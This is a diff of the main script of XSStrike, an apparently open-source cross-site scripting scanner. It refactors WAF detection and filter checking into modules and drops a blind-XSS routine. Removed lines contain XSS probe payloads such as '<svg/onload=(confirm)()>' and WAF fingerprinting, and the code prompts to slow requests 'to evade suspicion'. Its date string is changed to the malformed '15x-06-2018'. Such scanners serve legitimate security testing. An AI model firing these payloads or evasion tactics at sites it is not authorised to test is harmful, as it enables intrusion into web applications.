@@ -15,23 +15,20 @@ run = '\033[97m[~]\033[0m'
 
 import requests
 import re # Module for RegEx
-import sys # Standars system library
+import sys # Standard system library
 import os # Standard module for system related operations
 import webbrowser # To open pages in "real" browers
-import random
-try:
-    from core.injector import inject
-except:
-    print ('\033[91m[-]\033[0m XSStrike isn\'t compatible with python2. Run it with python3 i.e. \033[7;92mpython3 xsstrike\033[0m')
-    quit()
+from core.injector import inject
+from core.WAF_detector import WAF_detector
 from core.fuzzer import fuzzer
+from core.filter_checker import filter_checker
 from core.paramfinder import paramfinder
 from core.make_request import make_request
 from urllib.parse import parse_qs, quote_plus
 from urllib.parse import urlparse as parsy
 from time import sleep # To pause the program for a specific time
 
-date = '15-06-2018'
+date = '15x-06-2018'
 
 def update():
     print('%s Checking for updates...' % run)
@@ -85,110 +82,6 @@ print('''  %s____  ___  _________ _________ __          __ __
         \_/        \/        \/                     \/    \/ v2%s.%s0%s\n''' % (white,red,white,red,white, end))
 
 ##################
-#   WAF Detector
-##################
-
-#Function to detect WAF by analysing HTTP response codes
-def WAF_detector(url, param_data, method):
-    global WAF
-    WAF = False
-    noise = quote_plus('<script>confirm()</script>') #a payload which is noisy enough to provoke the WAF
-    fuzz = param_data.replace(xsschecker, noise) #Replaces xsschecker in param_data with noise
-    sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
-    if method == 'GET':
-        response = requests.get(url + fuzz) # Opens the noise injected payload
-    else:
-        response = requests.post(url, data=fuzz) # Opens the noise injected payload
-    code = str(response.status_code)
-    response_headers = str(response.headers)
-    if code[:1] != '2':
-        if '406' == code or '501' == code: # if the http response code is 406/501
-            WAF_Name = 'Mod_Security'
-            WAF = True
-        elif 'wordfence' in response.text.lower():
-            WAF_Name = 'Wordfence'
-            WAF = True
-        elif '999' == code: # if the http response code is 999
-            WAF_Name = 'WebKnight'
-            WAF = True
-        elif 'has disallowed characters' in response.text.lower():
-            WAF_Name = 'CodeIgniter'
-            WAF = True
-        elif 'comodo' in response.text.lower():
-            WAF_Name = 'Comodo'
-            WAF = True
-        elif 'sucuri' in response.text.lower():
-            WAF_Name = 'Sucuri'
-            WAF = True
-        elif '419' == code: # if the http response code is 419
-            WAF_Name = 'F5 BIG IP'
-            WAF = True
-        elif 'barra' in response_headers:
-            WAF_Name = 'Barracuda'
-            WAF = True
-        elif re.search(r'cf[-|_]ray', response_headers):
-            WAF_Name = 'Cloudflare'
-            WAF = True
-        elif 'AkamaiGHost' in response_headers:
-            WAF_Name = 'AkamaiGHost'
-            WAF = True
-        elif '403' == code: # if the http response code is 403
-            WAF_Name = 'Unknown'
-            WAF = True
-    else:
-        print('%s WAF Status: Offline' % good)
-    if WAF:
-        print('%s WAF Detected: %s' % (bad, WAF_Name))
-
-###################
-#   Filter Checker
-###################
-
-def filter_checker(url, param_data, method):
-    strength = '' # A variable for containing strength of the filter
-    # Injecting a malicious payload first by replacing xsschecker with our payload
-    try:
-        low_string = param_data.replace(xsschecker, quote_plus('<svg/onload=(confirm)()>'))
-        sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
-        if method == 'GET':
-            low_request = requests.get(url + low_string).text
-        else:
-            low_request = requests.post(url, data=low_string).text
-        if '<svg/onload=(confirm)()>' in low_request: # If payload was reflected in response
-            print("%s Filter Strength : %sLow or None%s" % (good, green, end))
-            print('%s Payload: <svg/onload=(confirm)()>' % good)
-            print('%s Efficiency: 100%%' % good)
-            choice = input('%s A payload with 100%% efficiency was found. Continue scanning? [y/N] ' % que).lower()
-            if choice == 'y':
-                pass
-            else:
-                if method == 'GET':
-                    webbrowser.open(url+param_data.strip(xsschecker)+'<svg/onload=(confirm)()>')
-                    quit()
-            strength = 'low' # As a malicious payload was not filtered, the filter is weak
-        else: # If malicious payload was filtered (was not in the response)
-            # Now we will use a less malicious payload
-            medium_string = param_data.replace(xsschecker, quote_plus('<zz onxx=yy>'))
-            sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
-            if method == 'GET':
-                medium_request = requests.get(url + medium_string).text
-            else:
-                medium_request = requests.post(url, data=medium_string).text
-            if '<zz onxx=yy>' in medium_request:
-                print('%s Filter Strength : %sMedium%s' % (info, yellow, end))
-                strength = 'medium'
-            else: #Printing high since result was not medium/low
-                print('%s Filter Strength : %sHigh%s' % (bad, red, end))
-                strength = 'high'
-                
-            return strength
-    except Exception as e:
-        try:
-            print('%s Target doesn\'t seem to respond properly. Error Code: %s' % (bad, re.search(r'\d\d\d', str(e)).group()))
-        except:
-            print('%s Target doesn\'t seem to respond properly.' % bad)
-
-##################
 #   Locater
 ##################
 
@@ -219,8 +112,9 @@ def locater(url, param_data, method):
         NUM_REFLECTIONS = response.lower().count(xsschecker.lower()) # Counts number of time d3v got reflected in webpage
         print('%s Number of reflections found: %i' % (info, NUM_REFLECTIONS))
         html_parser(response)
-    else: #Launched hulk if no reflection is found. Hulk Smash!
-        print('%s No reflection found.' % bad)
+        return True
+    else:
+        return False
 
 ###################
 #   Param Parser
@@ -245,13 +139,13 @@ def param_parser(target, param_data, method):
 def initiator(url, method):
     choice = input('%s Would you like to look for hidden parameters? [y/N] ' % que)
     if choice == 'y':
-        paramfinder(url, method, paranames, paravalues)
+        paramfinder(url, method, paranames, paravalues, xsschecker)
     if len(paranames) == 0:
         print('%s No parameters to test.' % bad)
         quit()
     else:
         if method == 'GET':
-            WAF_detector(url, '?'+paranames[0]+'='+xsschecker, method)
+            WAF = WAF_detector(url, '?'+paranames[0]+'='+xsschecker, method, xsschecker)
             current_param = 0
             for param_name in paranames:
                 print(('%s-%s' % (red, end)) * 50)
@@ -270,32 +164,23 @@ def initiator(url, method):
                         new_param_data.append(i)
                 
                 param_data = '?' + paranames[current_param] + '=' + xsschecker + ''.join(new_param_data)
+                delay = 0
                 if WAF:
                     choice = input('%s A WAF is active on the target. Would you like to delay requests to evade suspicion? [y/N] ' % que)
                     if choice == 'y':
                         delay = 6
-                    else:
-                        delay = 0
-                    fuzzer(url, param_data, method, delay) #Launches fuzzer aka Ninja
-                filter_checker(url, param_data, method) # Launces filter checker
-                locater(url, param_data, method) # Launcher locater
-                if len(occur_number) == 0:
-                    choice = input('%s Would you like to launch hulk for blind XSS detection? [Y/n] ' % que).lower()
-                    if choice != 'n':
-                        for payload in payloads:
-                            param_data = param_data.replace(xsschecker, payload) # Replaces the xsschecker with payload
-                            print('%s Payload: %s' % (info, payload))
-                            webbrowser.open(url + param_data) # Opens the "injected" URL in browser
-                            next = input('%s Press enter to execute next payload ' % que)
-                            #resetting payload
-                            param_data = param_data.replace(payload, xsschecker)
-                inject(url, param_data, method, occur_number, occur_location) # Launches injector
+                    fuzzer(url, param_data, method, delay, xsschecker) #Launches fuzzer aka Ninja
+                if not locater(url, param_data, method): # Launcher locater
+                    print ('%s No reflection found.' % bad)
+                else:
+                    filter_checker(url, param_data, method, delay, xsschecker) # Launces filter checker
+                    inject(url, param_data, method, occur_number, occur_location) # Launches injector
                 del occur_number[:] # Clears the occur_number list
                 del occur_location[:] # Clears the occur_location list
                 current_param = current_param + 1
 
         elif method == 'POST':
-            WAF_detector(url, '?'+paranames[0]+'='+xsschecker, method)
+            WAF = WAF_detector(url, '?'+paranames[0]+'='+xsschecker, method, xsschecker)
             current_param = 0
             for param_name in paranames:
                 print(('%s-%s' % (red, end)) * 50)
@@ -311,27 +196,17 @@ def initiator(url, method):
                     else:
                         new_param_data.append(i)
                 param_data = paranames[current_param] + '=' + xsschecker + ''.join(new_param_data)
+                delay = 0
                 if WAF:
                     choice = input('%s A WAF is active on the target. Would you like to delay requests to evade suspicion? [y/N] ' % que)
                     if choice == 'y':
                         delay = 6
-                    else:
-                        delay = 0
-                    fuzzer(url, param_data, method, delay) # Launches fuzzer aka Ninja
-                filter_checker(url, param_data, method) # Launches filter checker
-                locater(url, param_data, method) # Launches locater
-                if len(occur_number) == 0:
-                    choice = input('%s Would you like to generate some payloads for blind XSS? [Y/n] ' % que).lower()
-                    if choice == 'n':
-                        quit()
-                    else:
-                        for payload in payloads: # We will print the payloads from the payloads list
-                            print('%s  %s' % (info, payload))
-                            inject(url, param_data, method) # Launches injector
-                            del occur_number[:]
-                            del occur_location[:]
-                            current_param = current_param + 1
-                inject(url, param_data, method, occur_number, occur_location) # Launches injector
+                    fuzzer(url, param_data, method, delay, xsschecker) # Launches fuzzer aka Ninja
+                if not locater(url, param_data, method): # Launcher locater
+                    print ('%s No reflection found.' % bad)
+                else:
+                    filter_checker(url, param_data, method, delay, xsschecker) # Launches filter checker
+                    inject(url, param_data, method, occur_number, occur_location) # Launches injector
                 del occur_number[:] # Clears the occur_number list
                 del occur_location[:] # Clears the occur_location list
                 current_param = current_param + 1
